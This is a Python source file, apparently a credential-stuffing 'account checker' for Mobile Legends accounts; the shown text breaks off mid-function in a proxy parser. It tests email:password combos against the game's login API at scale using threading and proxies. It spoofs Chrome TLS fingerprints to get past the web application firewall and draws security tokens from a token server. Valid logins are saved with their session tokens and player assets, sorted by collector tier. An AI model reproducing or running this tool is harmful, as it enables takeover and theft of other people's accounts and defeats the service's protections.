# -*- coding: utf-8 -*-
import hashlib
import json
import os
import platform
import random
import re
import signal
import sys
import threading
import time
from datetime import datetime

try:
    import requests
    REQUESTS_OK = True
except Exception:
    requests = None
    REQUESTS_OK = False

try:
    from curl_cffi import requests as cffi_requests
    CURL_CFFI_OK = True
except Exception:
    cffi_requests = None
    CURL_CFFI_OK = False

IMPERSONATE_TARGETS = [
    'chrome131', 'chrome124', 'chrome120', 'chrome116', 'chrome110',
    'chrome107', 'chrome101', 'chrome99', 'chrome',
]

BASE = os.path.dirname(os.path.abspath(__file__))
LOGIN_URL = 'https://accountmtapi.mobilelegends.com'
MTACC_ORIGIN = 'https://mtacc.mobilelegends.com'
MTACC_HOME = 'https://mtacc.mobilelegends.com/'
MTACC_PAGE = 'https://mtacc.mobilelegends.com/v2.1/inapp/login-new'

SERVER_URL = 'http://192.168.204.72:5000'
TOKEN_SERVER_URL = os.environ.get('TOKEN_SERVER_URL', SERVER_URL)

OUTPUT_FOLDER = os.path.join(BASE, 'output')
OUT_DIR = OUTPUT_FOLDER
RETRY_FILE = os.path.join(OUTPUT_FOLDER, 'retry_accs.txt')
PROXY_FILE = os.path.join(BASE, 'proxies.txt')
DEVICES_FILE = os.path.join(BASE, 'devices.txt')
RETRY_ROUNDS = 3
THREAD_LIMIT = 10
MAX_RETRIES = 3

DEBUG = ('--debug' in sys.argv or '-d' in sys.argv
         or os.environ.get('ML_DEBUG', '').strip().lower() in ('1', 'true', 'yes', 'on'))
DEBUG_REQUESTS = not ('--no-debug' in sys.argv or '--quiet' in sys.argv
                     or os.environ.get('ML_DEBUG_REQUESTS', '').strip() == '0')
DEBUG_LOG_FILE = None
_debug_lock = threading.Lock()
stop_flag = False

UA = ("Mozilla/5.0 (Linux; Android 15; SM-A055F Build/AP3A.240905.015.A2; wv) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.199 "
      "Mobile Safari/537.36;UniWebView;mtakit")

try:
    from info import DeviceManager, get_player_info
    INFO_AVAILABLE = True
except Exception:
    INFO_AVAILABLE = False
    DeviceManager = None
    get_player_info = None

_device_manager = None


def parse_token_text(raw):
    if not raw or str(raw).strip() in ('NO_TOKENS', 'null', 'None', ''):
        return None, None
    raw = str(raw).strip()

    tok = None
    cert = None

    if raw.startswith('{'):
        try:
            d = json.loads(raw)
            if isinstance(d, dict):
                inner = d.get('token') if isinstance(d.get('token'), dict) else d
                tok = inner.get('u_atoken') or inner.get('token') or ''
                cert = inner.get('u_asig') or inner.get('asig') or ''
        except Exception:
            pass

    if not cert:
        m_asig = re.search(r'(?:^|[?&|;\s])u_asig=([^&\s|;]+)', raw)
        if m_asig:
            cert = m_asig.group(1).strip()

    if not tok:
        m_tok = re.search(r'(?:^|[?&|;\s])u_atoken=([^&\s|;]+)', raw)
        if m_tok:
            tok = m_tok.group(1).strip()

    if not cert:
        for delim in ('|', ' '):
            if delim in raw:
                parts = [p.strip() for p in raw.split(delim) if p.strip()]
                for p_item in parts:
                    if p_item.startswith('u_atoken='):
                        tok = p_item.split('=', 1)[1].strip()
                    elif p_item.startswith('u_asig='):
                        cert = p_item.split('=', 1)[1].strip()
                if not cert and len(parts) >= 2:
                    tok = parts[0]
                    cert = parts[1]
                    break
                elif not cert and len(parts) == 1:
                    cert = parts[0]
                    break

    if not cert and re.match(r'^[a-zA-Z0-9_-]{16,64}$', raw):
        cert = raw

    if tok and str(tok).strip().upper() in ('N/A', 'NONE', 'NULL', 'UNDEFINED', ''):
        tok = None
    if cert and str(cert).strip().upper() in ('N/A', 'NONE', 'NULL', 'UNDEFINED', ''):
        cert = None

    return (tok, cert)


def fetch_token_from_server(server_url=None, timeout=25):
    url_base = (server_url or TOKEN_SERVER_URL or '').rstrip('/')
    if not url_base:
        return None, None, ''

    import urllib.request
    import urllib.error

    url = f"{url_base}/get/token?format=txt"
    headers = {
        "Accept": "text/plain, application/json",
        "User-Agent": "MLBB-Checker/1.0"
    }

    t0 = time.time()
    last_err = ""
    while time.time() - t0 < timeout:
        if stop_flag:
            return None, None, 'STOPPED'
        try:
            req = urllib.request.Request(url, headers=headers, method="GET")
            with urllib.request.urlopen(req, timeout=5) as resp:
                raw = resp.read().decode("utf-8", errors="ignore").strip()
                tok, cert = parse_token_text(raw)
                if cert:
                    dbg_log('TOKEN_SERVER', f'Claimed 1 token: cert={cert[:14]}... (1 token 1 account)')
                    return tok, cert, raw
        except urllib.error.HTTPError as e:
            if e.code == 404:
                time.sleep(1.5)
                last_err = f"HTTP 404: No tokens available in server pool ({url})"
                continue
            else:
                last_err = f"HTTP Error {e.code}: {e.reason}"
                dbg_log('TOKEN_SERVER', last_err)
                time.sleep(2)
        except Exception as e:
            last_err = f"Connection error to {url}: {e}"
            dbg_log('TOKEN_SERVER', last_err)
            time.sleep(2)

    return None, None, last_err


def _ensure_utf8_console():
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    if os.name == 'nt':
        try:
            os.system('')
        except Exception:
            pass


_ensure_utf8_console()

_ui_lock = threading.RLock()
_write_line_lock = threading.Lock()

BW = 56
RESET = "\033[0m"
DIM = "\033[2m"


def rgb(r, g, b):    return f"\033[38;2;{r};{g};{b}m"
def lerp(a, b, t):   return int(a + (b - a) * t)

def gradient_text(text, c1, c2):
    if not text:
        return ""
    out = ""
    for i, ch in enumerate(text):
        t = i / max(len(text) - 1, 1)
        r = lerp(c1[0], c2[0], t)
        g = lerp(c1[1], c2[1], t)
        b = lerp(c1[2], c2[2], t)
        out += f"{rgb(r, g, b)}{ch}"
    return out + "\033[0m"

CYAN = (75, 220, 255); PURPLE = (175, 95, 255); PINK = (255, 95, 190)
BLUE = (80, 145, 255)
GREEN = (80, 235, 155); GOLD = (255, 205, 80); RED = (255, 85, 105)
WHITE = (238, 242, 255)
GRAY = (125, 135, 160); TEAL = (45, 205, 205); MINT = (125, 255, 210)
LAVENDER = (195, 155, 255)
SUNSET = (255, 135, 90); CORAL = (255, 110, 145)

A1, A2 = CYAN, PURPLE
H1, H2 = GREEN, MINT

W = "\033[38;2;80;220;120m"
BD = "\033[1m"


def c(color):    return rgb(*color)


def clear():     os.system("cls" if platform.system() == "Windows" else "clear")


def shortpath(pth):
    try:
        rel = os.path.relpath(pth, BASE)
    except Exception:
        return str(pth)
    if rel == ".":
        return BASE
    if rel.startswith(".."):
        return str(pth)
    return rel


def p(text, end="\n"):
    try:
        print(text, end=end, flush=True)
    except UnicodeEncodeError:
        print(text.encode("ascii", "ignore").decode("ascii"), end=end, flush=True)


def clear_line():
    p("\033[2K\r", end="")


def gtop(c1=A1, c2=A2, w=BW):
    return gradient_text("+" + "=" * (w - 2) + "+", c1, c2)


def gbot(c1=A1, c2=A2, w=BW):
    return gradient_text("+" + "=" * (w - 2) + "+", c1, c2)


def gmid(c1=A1, c2=A2, w=BW):
    return gradient_text("+" + "=" * (w - 2) + "+", c1, c2)


def gdash(c1=A1, c2=A2, w=BW):
    return gradient_text("+" + "-" * (w - 2) + "+", c1, c2)


def grow(text, c1=A1, c2=A2, w=BW):
    vlen, inside = 0, False
    for ch in text:
        if ch == "\033":
            inside = True
        elif inside and ch == "m":
            inside = False
        elif not inside:
            vlen += 1
    pad = max(w - 4 - vlen, 0)
    return f"{c(c1)}|{W} {text}{' ' * pad} {c(c2)}|{W}"


def gtitle(text, c1=A1, c2=A2, w=BW):
    vlen, inside = 0, False
    for ch in text:
        if ch == "\033":
            inside = True
        elif inside and ch == "m":
            inside = False
        elif not inside:
            vlen += 1
    total = w - 4 - vlen
    left = total // 2
    right = total - left
    return f"{c(c1)}|{W}{' ' * (left + 1)}{text}{' ' * (right + 1)}{c(c2)}|{W}"


def print_banner():
    banner = [
        r"██████ ██████  ██████  █████   █████ ██████",
        r"██     ██  ██ ██     ██   ██ ██     ██    ",
        r"██████ ██████ ██  ███ ██   ██ ██     ██████",
        r"    ██ ██  ██ ██   ██ ██   ██ ██        ██",
        r"██████ ██  ██  ██████ █████  █████ ██████ ",
    ]
    p("")
    for line in banner:
        p(gradient_text(line, CYAN, PURPLE))
    p(f"{c(CYAN)} MLBB ACCOUNT CHECKER // TOKEN SERVER TRANSPORT{W}")
    p(f"{c(GOLD)} 1 TOKEN = 1 ACCOUNT | FAST API VALIDATION{W}")
    p(f"{c(GRAY)} remote token fetch -> direct API login submit{W}")
    engine_desc = f"{c(GREEN)}curl_cffi (Chrome TLS/JA3 WAF Bypass){W}" if CURL_CFFI_OK else f"{c(GOLD)}requests (Standard Python SSL){W}"
    p(f" {c(GRAY)}Engine     :{W} {engine_desc}")
    p(f" {c(GRAY)}Token Srv  :{W} {c(WHITE)}{TOKEN_SERVER_URL}{W}")
    p("")


def dbg_log(tag, payload):
    if DEBUG:
        with _ui_lock:
            clear_line()
            p(" " + c(GRAY) + f"DBG {tag} " + str(payload) + W)
            print_status()


VALID_FILE = 'valid.txt'
INVALID_FILE = 'invalid.txt'
ERRORS_FILE = 'errors.txt'
RETRY_OUT = 'retry.txt'
VALID_DETAILED = 'valid_detailed.txt'
COLLECT_DIR = os.path.join(OUTPUT_FOLDER, 'Collection Tier')


def _out_path(name):
    return os.path.join(OUT_DIR, name)


def _write_line(name, line):
    with _write_line_lock:
        os.makedirs(OUT_DIR, exist_ok=True)
        with open(_out_path(name), "a", encoding="utf-8") as f:
            f.write(line + "\n")


def save(filepath, content):
    with _write_line_lock:
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(content + "\n")
        except Exception:
            pass


def save_to_retry(email, password):
    _write_line(RETRY_OUT, f"{email}:{password}")


def remove_from_retry(login, password):
    entry_key = extract_combo(f"{login}:{password}")
    try:
        with open(_out_path(RETRY_OUT), "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except FileNotFoundError:
        return
    remaining = []
    for line in lines:
        s = line.strip()
        if s and ":" in s:
            try:
                if extract_combo(s) == entry_key:
                    continue
            except Exception:
                pass
        remaining.append(line)
    with _ui_lock:
        with open(_out_path(RETRY_OUT), "w", encoding="utf-8") as f:
            f.writelines(remaining)


stats = {
    "total": 0, "checked": 0, "valid": 0, "invalid": 0, "errors": 0,
    "start_time": time.time(), "country_stats": {}, "collector_stats": {},
    "highest_level": 0, "top_accounts": [],
}


def reset_stats():
    global stats
    stats = {
        "total": 0, "checked": 0, "valid": 0, "invalid": 0, "errors": 0,
        "start_time": time.time(), "country_stats": {}, "collector_stats": {},
        "highest_level": 0, "top_accounts": [],
    }


def elapsed_str():
    e = time.time() - stats["start_time"]
    h = int(e // 3600); m = int((e % 3600) // 60); s = int(e % 60)
    if h > 0:
        return f"{h}h{m}m{s}s"
    if m > 0:
        return f"{m}m{s}s"
    return f"{s}s"


def progress_bar(current, total, width=24):
    ratio = current / total if total else 0
    filled = max(0, min(width, int(ratio * width)))
    filled_part = "\u2501" * filled
    empty_part = "\u2500" * (width - filled)
    return f"{c(CYAN)}{filled_part}{c(GRAY)}{empty_part}{W}"


def print_status():
    with _ui_lock:
        v = stats["valid"]
        i = stats["invalid"]
        e = stats["errors"]
        ch = stats["checked"]
        t = stats["total"]
        started = stats["start_time"]

    elapsed = max(time.time() - started, 0.001)
    rate = ch / elapsed
    remaining = max(t - ch, 0)
    eta = remaining / rate if rate > 0 else 0
    eta_text = f"{int(eta // 60)}m {int(eta % 60)}s" if eta else "--"
    percent = (ch / t * 100) if t else 0
    bar = progress_bar(ch, t)

    clear_line()
    p(
        f" {bar} {c(WHITE)}{percent:5.1f}%{W} "
        f"{c(GRAY)}{ch:,}/{t:,}{W}  "
        f"{c(GREEN)}OK {v}{W}  "
        f"{c(RED)}BAD {i}{W}  "
        f"{c(GOLD)}ERR {e}{W}  "
        f"{c(CYAN)}{rate:.1f}/s{W}  "
        f"{c(PURPLE)}ETA {eta_text}{W}",
        end=""
    )


def print_result(rtype, login, password, msg=""):
    clear_line()
    if rtype == "invalid":
        p(f" {c(RED)}[ BAD ]{W} {c(RED)}{login}:{password}{W} "
          f"{c(GRAY)}\u2192 {msg}{W}")
    elif rtype in ("error", "timeout"):
        sym = "~" if rtype == "timeout" else "!"
        p(f" {c(GOLD)}[ {sym} ERR ]{W} {c(GOLD)}{login}:{password}{W} "
          f"{c(GRAY)}\u2192 {msg or 'Timeout'}{W}")
    print_status()


def print_hit(login, password, data):
    guid = data.get("guid", "?")
    session = data.get("session", "?")

    name = data.get("name", "")
    level = data.get("level", "")
    skins = data.get("skins", "")
    heroes = data.get("heroes", "")
    rank = data.get("rank", "")
    country = data.get("country", "")
    collector = data.get("collector", "")

    file_output = f"{login}:{password} | GUID: {guid} | Session: {session}"
    info_fields = []
    if info_present(data):
        if name:
            info_fields.append(f"Name: {name}")
        if level != "":
            info_fields.append(f"Lv: {level}")
        if skins != "":
            info_fields.append(f"Skins: {skins}")
        if heroes != "":
            info_fields.append(f"Heroes: {heroes}")
        if rank != "":
            info_fields.append(f"Rank: {rank}")
        if collector != "":
            info_fields.append(f"Collector: {collector}")
        if country != "":
            info_fields.append(f"Country: {country}")
    if info_fields:
        file_output += " | " + " | ".join(info_fields)
    save(_out_path(VALID_FILE), file_output)

    console_output = f"{login}:{password} | GUID: {guid} | Session: {session}"
    if info_present(data):
        console_output += (f" | Lv: {level} | Skins: {skins} | Heroes: {heroes} "
                           f"| Rank: {rank} | {country}")

    clear_line()
    p(f" {c(GREEN)}[  HIT ]{W} {console_output}")
    print_status()


def format_full_info(login, password, data):
    pd = data.get("player_data", {})
    lines = [f"Login: {login}:{password}"]

    guid = data.get("guid", "")
    session = data.get("session", "")

    IN   = "      "
    SUB  = "          "
    SUB2 = "              "

    si = pd.get("security_info", {})
    v2l = si.get("v2l_status", "")
    if v2l:
        lines.append(f"{IN}V2L: {v2l}")
    lines.append(f"{IN}Status: Valid")
    if guid:
        lines.append(f"{SUB}GUID: {guid}")
    if session:
        lines.append(f"{SUB}Session: {session}")

    if not pd:
        lines.append(f"{SUB}(no full info available)")
        return "\n".join(lines)

    bi = pd.get("basic_info", {})
    skin_info = pd.get("skin_info", {})
    gi = pd.get("game_info", {})
    li = pd.get("location_info", {})
    ci = pd.get("collector_info", {})
    ei = pd.get("extra_info", {})

    def add(name, value, indent=SUB):
        if value in (None, "", 0, "0", 0.0, "N/A", "Unknown"):
            return
        lines.append(f"{indent}{name}: {value}")

    lines.append(f"{IN}Player Info =>")
    add("ID", bi.get("player_id"))
    add("Server", bi.get("server"))
    add("Nickname", bi.get("nickname"))
    add("Level", bi.get("level"))
    add("Current Heroes", bi.get("hero_count"))

    breakdown = skin_info.get("skin_breakdown", {})
    total = breakdown.get("Total Skins") or bi.get("skin_count")
    add("Skins", total)
    for tier in ["Supreme Skins", "Grand Skins", "Exquisite Skins",
                 "Deluxe Skins", "Exceptional Skins", "Common Skins"]:
        if tier in breakdown and breakdown[tier]:
            lines.append(f"{SUB2}{tier}: {breakdown[tier]}")

    add("Location", li.get("location"))
    add("Last Login", li.get("last_login"))
    add("Last Login Country", li.get("last_login_country"))
    add("Create Account Country", li.get("create_account_country"))
    add("Created", ei.get("creation_date"))
    add("Current Rank", gi.get("current_rank"))
    add("High Rank", gi.get("high_rank"))
    add("Achievement Points", gi.get("achievement_points"))
    add("Collector Rank", ci.get("collector_rank"))
    add("Collector Points", ci.get("collector_point"))
    add("Collector Tier", ci.get("collector_tier"))
    add("Squad", gi.get("squad"))
    add("Squad ID", gi.get("squad_id"))
    add("Squad Motto", ei.get("squad_motto"))
    add("Matches", gi.get("matches"))
    add("Wins", ei.get("win_count"))
    add("Win Rate", ei.get("win_rate"))
    add("Total Battles", ei.get("total_battles"))
    add("Battle Points", ei.get("battle_points"))
    add("Diamonds", ei.get("diamonds"))
    add("Starlight", ei.get("starlight_user"))
    add("Starlight Count", ei.get("starlight_count"))
    add("MCL Champion Wins", ei.get("mcl_champion_wins"))
    add("Rating", ei.get("rating_score"))
    add("Followers", ei.get("followers"))
    add("Popularity", ei.get("popularity"))
    add("Likes", ei.get("likes"))
    add("Credits", ei.get("credits_score"))
    add("Affinity", ei.get("affinity"))
    add("Restriction", ei.get("restriction_flags"))
    add("Bindings", si.get("bindings"))
    add("Emblems", ei.get("emblem_levels"))
    add("Latest Skin", ei.get("latest_skin_id"))
    add("Latest Skin Tier", ei.get("latest_skin_tier"))
    add("Latest Skin Date", ei.get("latest_skin_date"))
    add("Last Heroes Purchase", ei.get("last_heroes_purchase"))

    hero_hist = gi.get("hero_history") or []
    if hero_hist:
        add("Hero History (Latest 5)", ", ".join(hero_hist[:5]))
    add("Skin History", ei.get("skin_history"))

    return "\n".join(lines)


def valid_collector_tier(data):
    tier = data.get("collector", "")
    return tier if tier else "No Tier"


def format_minimal_info(login, password, data):
    pd = data.get("player_data", {})
    lines = [f"Login: {login}:{password}"]

    guid = data.get("guid", "")
    session = data.get("session", "")

    IN   = "      "
    SUB  = "          "
    SUB2 = "              "

    si = pd.get("security_info", {})
    v2l = si.get("v2l_status", "")
    if v2l:
        lines.append(f"{IN}V2L: {v2l}")
    lines.append(f"{IN}Status: Valid")
    if guid:
        lines.append(f"{SUB}GUID: {guid}")
    if session:
        lines.append(f"{SUB}Session: {session}")

    if not pd:
        lines.append(f"{SUB}(no full info available)")
        return "\n".join(lines)

    bi = pd.get("basic_info", {})
    skin_info = pd.get("skin_info", {})
    gi = pd.get("game_info", {})
    ci = pd.get("collector_info", {})

    def add(name, value, indent=SUB):
        if value in (None, "", 0, "0", 0.0, "N/A", "Unknown"):
            return
        lines.append(f"{indent}{name}: {value}")

    lines.append(f"{IN}Player Info =>")
    add("ID", bi.get("player_id"))
    add("Server", bi.get("server"))
    add("Nickname", bi.get("nickname"))
    add("Level", bi.get("level"))
    add("Current Heroes", bi.get("hero_count"))

    breakdown = skin_info.get("skin_breakdown", {})
    total = breakdown.get("Total Skins") or bi.get("skin_count")
    add("Skins", total)
    for tier in ["Supreme Skins", "Grand Skins", "Exquisite Skins",
                 "Deluxe Skins", "Exceptional Skins", "Common Skins"]:
        if tier in breakdown and breakdown[tier]:
            lines.append(f"{SUB2}{tier}: {breakdown[tier]}")

    add("Current Rank", gi.get("current_rank"))
    add("High Rank", gi.get("high_rank"))

    if any(v not in (None, "", 0, "0", "N/A", "Unknown")
           for v in (ci.get("collector_point"), ci.get("collector_tier"))):
        lines.append("")
        add("Collector Points", ci.get("collector_point"))
        add("Collector Tier", ci.get("collector_tier"))

    return "\n".join(lines)


def persist_detailed_hit(login, password, data):
    try:
        detailed = format_full_info(login, password, data)
        save(_out_path(VALID_DETAILED), detailed + "\n")
        tier = valid_collector_tier(data)
        safe = "".join(ch if ch.isalnum() or ch in " _-" else "_" for ch in tier).strip()
        safe = safe if safe else "No Tier"
        save(os.path.join(COLLECT_DIR, "Full", f"{safe}.txt"), detailed + "\n")
        minimal = format_minimal_info(login, password, data)
        save(os.path.join(COLLECT_DIR, "Minimal", f"{safe}.txt"), minimal + "\n")
    except Exception:
        pass


def info_present(data):
    return data.get("level") is not None and data.get("level") != ""


def finish_single(login, password, data):
    status = data.get("status", "error")

    if status == "valid":
        with _ui_lock:
            stats["valid"] += 1
            stats["checked"] += 1
        remove_from_retry(login, password)
        data = enrich_player_info(data)
        print_hit(login, password, data)
        persist_detailed_hit(login, password, data)
        print_status()

    elif status == "invalid":
        with _ui_lock:
            stats["invalid"] += 1
            stats["checked"] += 1
        remove_from_retry(login, password)
        msg = data.get("message", "Invalid")
        code = data.get("code")
        if code not in (None, 0) and f"code {code}" not in str(msg):
            msg = f"{msg} (code {code})"
        print_result("invalid", login, password, msg=msg)
        save(_out_path(INVALID_FILE), f"{login}:{password} | {msg}")

    else:
        with _ui_lock:
            stats["errors"] += 1
            stats["checked"] += 1
        msg = data.get("message", "Unknown")
        err = data.get("error", "")
        if err == 'server_code' or err in ('fetch_timeout', 'fetch_fail'):
            label = msg
        else:
            label = err if err else msg
        print_result("error", login, password, msg=label)
        save(_out_path(ERRORS_FILE), f"{login}:{password} | {label}")
        if msg != "stopped":
            save_to_retry(login, password)


def enrich_player_info(data):
    if not (INFO_AVAILABLE and _device_manager and _device_manager.devices):
        return data
    try:
        guid = data.get("guid", "")
        session = data.get("session", "")
        if not guid or not session:
            return data
        player = get_player_info(guid, session, device_manager=_device_manager, max_device_retries=6)
        if isinstance(player, dict) and player.get("status") == "success":
            data["player_data"] = player.get("data", {})
            info = player.get("data", {}).get("basic_info", {})
            ginfo = player.get("data", {}).get("game_info", {})
            cinfo = player.get("data", {}).get("collector_info", {})
            data["level"] = info.get("level", "")
            data["skins"] = info.get("skin_count", 0)
            data["heroes"] = info.get("hero_count", 0)
            data["name"] = info.get("nickname", "")
            data["rank"] = ginfo.get("current_rank", "")
            data["collector"] = cinfo.get("collector_tier", "")
            data["country"] = player.get("data", {}).get("location_info", {}).get("last_login_country", "")
            try:
                lvl = int(data.get("level", 0) or 0)
                with _ui_lock:
                    if lvl > stats["highest_level"]:
                        stats["highest_level"] = lvl
                    stats["top_accounts"] = sorted(
                        (stats["top_accounts"] + [data])[:3],
                        key=lambda a: int(a.get("level", 0) or 0),
                        reverse=True)
            except Exception:
                pass
    except Exception:
        pass
    return data


def extract_combo(line):
    parts = line.split(":", 1)
    if len(parts) == 2:
        return f"{parts[0].strip().lower()}:{parts[1].strip()}"
    return line.strip().lower()


def load_checked():
    checked = set()
    if not os.path.exists(OUTPUT_FOLDER):
        return checked
    for root, dirs, files in os.walk(OUTPUT_FOLDER):
        dirs[:] = [d for d in dirs if d.lower() != 'collection tier']
        for fname in files:
            if not fname.endswith(".txt"):
                continue
            if "retry" in fname:
                continue
            path = os.path.join(root, fname)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        if "=>" in line:
                            combo = line.split("=>")[0].strip()
                            if ":" in combo:
                                checked.add(extract_combo(combo))
                        elif "|" in line:
                            combo = line.split("|")[0].strip()
                            if ":" in combo:
                                checked.add(extract_combo(combo))
            except Exception:
                pass
    return checked


def print_summary():
    e = time.time() - stats["start_time"]
    h = int(e // 3600); m = int((e % 3600) // 60); s = int(e % 60)
    v = stats["valid"]; iv = stats["invalid"]; er = stats["errors"]
    t = stats["checked"]; rate = t / e if e > 0 else 0

    p("")
    p(f" {gtop()}")
    p(f" {gtitle(f'{c(WHITE)}{BD}SESSION COMPLETE{W}')}")
    p(f" {gmid()}")
    p(f" {grow(f'{c(GREEN)}Valid accounts{W}   {c(WHITE)}{v:,}{W}')}")
    p(f" {grow(f'{c(RED)}Invalid accounts{W} {c(WHITE)}{iv:,}{W}')}")
    p(f" {grow(f'{c(GOLD)}Errors{W}           {c(WHITE)}{er:,}{W}')}")
    p(f" {grow(f'{c(CYAN)}Throughput{W}       {c(WHITE)}{rate:.1f} acc/s{W}')}")
    p(f" {grow(f'{c(PURPLE)}Elapsed{W}          {c(WHITE)}{h}h {m}m {s}s{W}')}")
    p(f" {gbot()}")

    cs = stats["country_stats"]
    if cs:
        p(f"\n {gtitle(f'{c(WHITE)}{BD}COUNTRY BREAKDOWN{W}')}")
        for country, count in sorted(cs.items(), key=lambda x: x[1], reverse=True)[:10]:
            p(f"  {c(CYAN)}\u2022{W} {c(WHITE)}{country:<18}{W} {c(GREEN)}{count:,}{W}")

    ct = stats["collector_stats"]
    if ct:
        p(f"\n {gtitle(f'{c(WHITE)}{BD}COLLECTOR BREAKDOWN{W}')}")
        for tier, count in sorted(ct.items(), key=lambda x: x[1], reverse=True):
            p(f"  {c(GOLD)}\u2022{W} {c(WHITE)}{tier:<18}{W} {c(GREEN)}{count:,}{W}")

    ta = stats["top_accounts"]
    if ta:
        p(f"\n {gtitle(f'{c(WHITE)}{BD}TOP 3 HIGHEST LEVEL{W}')}")
        for idx, acc in enumerate(ta, 1):
            p(f"  {c(GOLD)}#{idx}{W} {acc['country']} | Lvl {acc['level']} | {acc['name']}")

    p(f"\n {c(GREEN)}\u25c6 Checking completed{W}")
    p(f" {c(GOLD)}\u25c6 Results saved in {shortpath(OUT_DIR)}{W}")
    bar_line = '\u2500' * (BW - 2)
    p(f" {c(GRAY)}{bar_line}{W}\n")


def generate_sign(params):
    all_params = dict(params)
    all_params['op'] = 'new_login_pwd'
    raw = '&'.join(f'{k}={all_params[k]}' for k in sorted(all_params))
    return hashlib.md5(raw.encode()).hexdigest().lower()


def gen_payload(email, password):
    md5pwd = hashlib.md5(password.encode()).hexdigest().lower()
    params = {'account': email, 'country': '', 'md5pwd': md5pwd}
    return {'op': 'new_login_pwd', 'sign': generate_sign(params),
            'params': params, 'lang': 'en'}


def looks_real_json(text):
    if not text:
        return False
    t = text.lstrip()
    return t.startswith('{') and ('"code"' in t[:200] or '"message"' in t[:200])


SEC_CH_UA = ('"Chromium";v="151", "Google Chrome";v="151", '
             '"Not.A/Brand";v="24"')


def _navigation_headers():
    return {
        'User-Agent': UA,
        'Accept': ('text/html,application/xhtml+xml,application/xml;q=0.9,'
                   'image/avif,image/webp,image/apng,*/*;q=0.8'),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua': SEC_CH_UA,
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Connection': 'keep-alive',
        'X-Requested-With': 'com.mobile.legends',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }


def build_api_headers(content_type, support_brotli=True):
    enc = 'gzip, deflate, br' if support_brotli else 'gzip, deflate'
    return {
        'Content-Type': content_type,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': enc,
        'Origin': MTACC_ORIGIN,
        'Referer': MTACC_HOME,
        'User-Agent': UA,
        'X-Requested-With': 'com.mobile.legends',
        'Connection': 'keep-alive',
        'sec-ch-ua': SEC_CH_UA,
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }


def new_http_session():
    if CURL_CFFI_OK and cffi_requests is not None:
        for tgt in IMPERSONATE_TARGETS:
            try:
                s = cffi_requests.Session(impersonate=tgt)
                return s, True, tgt
            except Exception:
                continue
        try:
            return cffi_requests.Session(), True, None
        except Exception:
            pass
    if REQUESTS_OK:
        return requests.Session(), False, None
    return None, False, None


def prime_waf_session(session, is_cffi=False, impersonate=None):
    if session is None:
        return False
    ok = False
    targets = [
        (f'{LOGIN_URL}/', {
            'Accept': 'application/json, text/plain, */*',
            'Origin': MTACC_ORIGIN,
            'Referer': MTACC_HOME,
            'User-Agent': UA,
            'X-Requested-With': 'com.mobile.legends',
            'Connection': 'keep-alive',
            'sec-ch-ua': SEC_CH_UA,
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
        }),
        (MTACC_PAGE, _navigation_headers()),
    ]
    for url, hdrs in targets:
        try:
            kw = {'headers': hdrs, 'timeout': 15}
            if is_cffi and impersonate:
                kw['impersonate'] = impersonate
            if not is_cffi:
                kw['allow_redirects'] = True
            session.get(url, **kw)
            ok = True
        except Exception as e:
            dbg_log('PRIME', f'preflight {url} failed: {str(e)[:80]}')
    return ok


VERDICT_MSGS = (
    "Error_PasswdError",
    "Error_PasswordError",
    "Error_NeedEmailCode",
    "Error_InvalidAccount",
    "Error_AccountNotFound",
    "Error_PassWordNeedReset",
)


def classify_login(js, raw):
    if not looks_real_json(raw):
        waf_type = 'waf_405_challenge' if ('405' in (raw or '') or 'aliyun' in (raw or '').lower()) else 'waf_or_nonjson'
        return {'status': 'error', 'error': waf_type,
                'raw': (raw or '')[:200]}
    try:
        data = json.loads(raw)
    except Exception:
        return {'status': 'error', 'error': 'bad_json', 'raw': raw[:200]}
    code = data.get('code')
    msg = data.get('message', '')
    m = (msg or '').lower()
    if msg == 'Error_ECaptcha_VerifyFail':
        return {'status': 'captcha_fail', 'code': code, 'msg': msg,
                'message': msg, 'full_response': data}
    if code == 1013 or 'captcha' in m or 'ecaptcha' in m:
        return {'status': 'captcha', 'code': code, 'msg': msg}
    if code == 0 or msg == 'Error_Success':
        d = data.get('data', {}) or {}
        guid = d.get('guid') or data.get('guid')
        session = d.get('session') or data.get('session')
        if not session:
            return {'status': 'invalid', 'code': code, 'msg': msg,
                    'message': 'No session token', 'full_response': data}
        return {'status': 'valid', 'guid': guid, 'session': session,
                'code': code, 'msg': msg, 'message': msg,
                'full_response': data}
    for tok in VERDICT_MSGS:
        if tok.lower() in m:
            return {'status': 'invalid', 'code': code, 'msg': msg,
                    'message': msg, 'verdict': msg, 'full_response': data}
    label = msg or f'code {code}'
    if code is not None:
        label = f'{label} (code {code})'
    return {'status': 'error', 'error': 'server_code', 'code': code,
            'msg': msg, 'message': label, 'full_response': data}


def _parse_proxy_line(ln):
    ln = ln.strip()
    if not ln or ln.startswith('#'):
        return None
    if '://' in ln:
        return {'server': ln}
    parts = ln.split(':')
    if len(parts) >= 4:
        return {'server': f'http://{parts[0]}:{parts[1]}',
                'username': parts[2],
                'password': ':'.join(parts[3:])}
    if len(parts) == 2:
